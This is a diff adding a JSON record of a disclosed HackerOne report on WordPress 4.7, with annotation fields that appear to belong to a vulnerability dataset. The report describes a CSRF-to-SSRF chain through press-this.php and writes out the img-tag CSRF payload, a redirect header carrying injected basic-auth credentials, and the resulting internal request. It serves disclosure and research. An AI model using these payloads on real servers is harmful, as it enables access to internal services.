@@ -1,0 +1,42 @@
+{
+    "reported_to": "WordPress",
+    "reported_by": "skansing ",
+    "title": "Wordpress 4.7 - CSRF -> HTTP SSRF any private ip:port and basic-auth",
+    "content": "\nDescription\nThis report is a variant on report #110801 but with broader vector.\n#110801 was a XSRF SSRF that allowd unintended GET requests to 0.0.0.0 on port 80, 443 and 8080.\nThis vulnerability uses same entry vector of the press this scrape function but entirely bypasses the ip and port filter allowing the SSRF to any ip, port and appending basic-auth headers.\nThe ip:port bypass is made by forging a CSRF to wp-admin/press-this.php?u=http://[HOST|IP] with a valid hostname/ip. The valid host will then reply with a crafted header targeting location: http://[privateip]:[port] like 192.168.01, 127.0.01:11211 .. resulting in the final SSRF. The redirect can also include a basic-auth which the server adds as a Authorization header.\nPoC\nThe PoC is very similar to #110801 but with a addition of a valid domain which replies with a redirection header and http code.\nVictim has privileges to use press-this of example.com\nVictim has a session running\nVictim gets a payload similar to `<img src=\"//example.com/wp-admin/press-this.php?u=http://attackers-domain.com&url-scan-submit=Scan\" />\nVictim sends a scrape request to attackers-domain.com\nAttackers domain replies with a 302 and a location header\nCode 34 Bytes\n1Location: http://192.168.0.1:12345\nServer blindly follows redirect and the internal ip gets hit.\nThis can be escalated by adding a basic auth scheme to the redirect url as\nCode 46 Bytes\n1Location: http://admin:admin@192.168.0.1:12345\nListening to the SSRF on 192.168.0.1 would yield a incoming HTTP from the victims server carrying a basic-auth header crafted towards the internal endpoint.\nCode 228 Bytes\n1GET / HTTP/1.1\n2Host: 192.168.0.1:12345\n3Authorization: Basic YWRtaW46YWRtaW4=\n4User-Agent: Press This (WordPress/4.7-RC1);\n5Accept: */*\n6Accept-Encoding: deflate, gzip\n7Referer: http://admin:admin@192.168.0.1:12345/\n8Connection: close\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Cross-Site Request Forgery (CSRF)"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1511189940,
+    "report_url": "https://hackerone.com/reports/187520",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Victim with privileges to use press-this on example.com and an active session visits a malicious page containing: `<img src=\"//example.com/wp-admin/press-this.php?u=http://attackers-domain.com&url-scan-submit=Scan\" />`"
+        ],
+        [
+            2,
+            "Attacker's domain responds with a 302 redirect and a crafted Location header pointing to an internal IP with basic auth: `Location: http://admin:admin@192.168.0.1:12345`"
+        ],
+        [
+            3,
+            "WordPress server blindly follows the redirect and sends a request to the internal service with the attacker's crafted basic auth header"
+        ]
+    ],
+    "vuln_description": "This vulnerability is a CSRF to SSRF chain in WordPress 4.7 that allows bypassing IP/port restrictions through a crafted redirect. By combining a CSRF attack against the press-this.php scraper with a malicious redirect response containing basic auth credentials, an attacker can force the WordPress server to make unauthorized requests to internal services with attacker-controlled authentication headers.",
+    "reason": "The vulnerability requires understanding multiple components: the CSRF vector in press-this.php, the IP/port filter bypass via redirects, and the basic auth injection. The interaction between these components is non-obvious, particularly how the redirect bypasses security filters and how basic auth headers get propagated. The attack also requires manipulating the application state through the redirect flow.",
+    "new_complexity": "HIGH",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": "110801"
+}
